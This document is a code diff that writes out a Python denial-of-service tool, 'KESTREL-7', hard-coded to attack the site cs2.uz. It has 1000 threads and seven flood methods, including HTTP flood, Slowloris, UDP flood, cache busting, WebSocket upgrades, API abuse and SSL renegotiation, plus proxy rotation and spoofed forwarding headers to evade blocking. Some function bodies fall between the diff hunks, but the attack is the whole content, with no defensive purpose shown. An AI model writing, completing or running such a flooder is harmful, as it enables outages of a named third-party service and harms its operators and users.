@@ -600,6 +600,16 @@ Proxy rotatsiya, random header, random X-Forwarded-For.
 1000+ parallel oqim.
 """
 
+cat > /app/main.py << 'EOF'
+#!/usr/bin/env python3.14
+# -*- coding: utf-8 -*-
+"""
+KESTREL-7 / CS2.UZ_TOTAL_FLOOD
+7 xil hujum usuli: HTTP GET/POST, Slowloris, UDP, Cache Buster, WebSocket, API exploit, SSL reneg.
+Proxy rotatsiya, random header, random X-Forwarded-For.
+1000+ parallel oqim.
+"""
+
 import requests
 import threading
 import time
@@ -619,7 +629,7 @@ TARGET_HTTP = "http://cs2.uz"
 THREADS = 1000
 TIMEOUT = 1.5
 USE_PROXY = False
-PROXY_LIST = []  # ['http://user:pass@ip:port', ...]
+PROXY_LIST = []
 
 PROXIES = [{'http': p, 'https': p} for p in PROXY_LIST] if PROXY_LIST else []
 
@@ -647,7 +657,6 @@ def random_headers():
 def get_random_proxy():
     return random.choice(PROXIES) if PROXIES else None
 
-# ------------------ 1. HTTP FLOOD ------------------
 def http_flood():
     session = requests.Session()
     adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
@@ -684,7 +693,6 @@ def http_flood():
         except:
             time.sleep(0.01)
 
-# ------------------ 2. SLOWLORIS ------------------
 def slowloris_bypass():
     while True:
         sockets = []
@@ -706,7 +714,6 @@ def slowloris_bypass():
                     pass
         time.sleep(0.01)
 
-# ------------------ 3. UDP FLOOD ------------------
 def udp_flood():
     while True:
         try:
@@ -721,7 +728,6 @@ def udp_flood():
             pass
         time.sleep(0.001)
 
-# ------------------ 4. CACHE BUSTER ------------------
 def cache_buster():
     session = requests.Session()
     while True:
@@ -737,7 +743,6 @@ def cache_buster():
         except:
             time.sleep(0.01)
 
-# ------------------ 5. WEB SOCKET UPGRADE ------------------
 def ws_upgrade():
     while True:
         try:
@@ -752,7 +757,6 @@ def ws_upgrade():
             pass
         time.sleep(0.01)
 
-# ------------------ 6. API EXPLOIT ------------------
 def api_exploit():
     session = requests.Session()
     payloads = [
@@ -775,7 +779,6 @@ def api_exploit():
         except:
             time.sleep(0.02)
 
-# ------------------ 7. SSL RENEGOTIATION ------------------
 def ssl_reneg():
     while True:
         try:
@@ -792,7 +795,6 @@ def ssl_reneg():
             pass
         time.sleep(0.01)
 
-# ------------------ MAIN ------------------
 def main():
     print("=" * 70)
     print("[*] KESTREL-7 : CS2.UZ ga 7 QATLAMLI HUJUM")
@@ -827,3 +829,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+EOF
